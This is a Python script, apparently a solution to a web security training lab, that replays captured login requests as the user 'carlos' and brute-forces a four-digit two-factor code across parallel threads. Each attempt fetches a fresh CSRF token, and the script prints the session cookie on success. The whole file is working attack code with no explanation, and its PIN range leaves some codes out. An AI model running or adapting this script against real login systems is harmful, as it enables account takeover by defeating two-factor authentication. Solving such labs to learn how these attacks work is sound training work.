import requests
import re
import concurrent.futures

def parse_raw_http_file(filename):
    with open(filename, 'r', encoding='utf-8') as f:
        lines = f.read().splitlines()

    # Parse method and path from the first line
    method, path, _ = lines[0].split()
    headers = {}
    cookies = {}
    data = ''
    i = 1

    # Parse headers
    while i < len(lines) and lines[i]:
        if ':' in lines[i]:
            key, value = lines[i].split(':', 1)
            headers[key.strip()] = value.strip()
        i += 1

    # Parse body (after empty line)
    i += 1
    if i < len(lines):
        data = '\n'.join(lines[i:])

    # Extract cookies from headers
    if 'Cookie' in headers:
        for item in headers.pop('Cookie').split(';'):
            if '=' in item:
                k, v = item.strip().split('=', 1)
                cookies[k] = v


    host = headers.get('Host', '')
    url = f"https://{host}{path}"

    return method, url, headers, cookies, data

def send_request_from_file(filename, data=None, session=None):
    method, url, headers, cookies, file_data = parse_raw_http_file(filename)

    # Override data if provided
    if data is not None:
        file_data = data

    # Override session cookie if provided
    if session is not None:
        cookies['session'] = session

    resp = requests.request(method, url, headers=headers, cookies=cookies, data=file_data, allow_redirects=False)
    return resp

def extract_csrf_token(html):
    match = re.search(r'name="csrf"\s+value="([^"\']+)"', html)
    if match:
        return match.group(1)
    return None

def try_pin(pin):
    # jump 1
    resp = send_request_from_file('get_login_1.txt')
    session = resp.cookies.get('session')
    csrf_token = extract_csrf_token(resp.text)

    # jump 2
    post_data = f'csrf={csrf_token}&username=carlos&password=montoya'
    resp = send_request_from_file('post_login_1.txt', data=post_data, session=session)
    session = resp.cookies.get('session')

    # jump 3
    resp = send_request_from_file('get_login_2.txt', session=session)
    csrf_token = extract_csrf_token(resp.text)

    # jump 4
    post_data = f'csrf={csrf_token}&mfa-code={str(pin)}'
    resp = send_request_from_file('post_login_2.txt', data=post_data, session=session)

    if 'Incorrect security code' not in resp.text:
        print(f"Login successful with PIN: {pin}")
        print("Session:", resp.cookies.get('session'))
        return True
    else:
        print(pin, "failed")
        return False

# Use a thread pool to try PINs in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = {executor.submit(try_pin, pin): pin for pin in range(1000, 9999)}
    for future in concurrent.futures.as_completed(futures):
        if future.result():
            break  # Stop on first success
